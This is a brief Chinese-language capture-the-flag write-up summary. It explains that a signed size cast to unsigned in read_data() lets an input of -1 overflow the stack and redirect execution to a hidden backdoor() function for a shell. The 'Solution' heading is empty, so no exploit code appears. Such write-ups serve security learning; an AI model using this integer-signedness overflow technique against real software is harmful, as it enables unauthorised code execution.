Summary

这题是一个很直接的栈溢出题，核心点在于 read_data() 里把有符号 int size 强转成了 unsigned int 传给 read()。输入 -1 后长度会变成一个超大的无符号数，从而覆盖返回地址，最后跳到隐藏的 backdoor() 拿到 shell 并读取 flag。

Solution
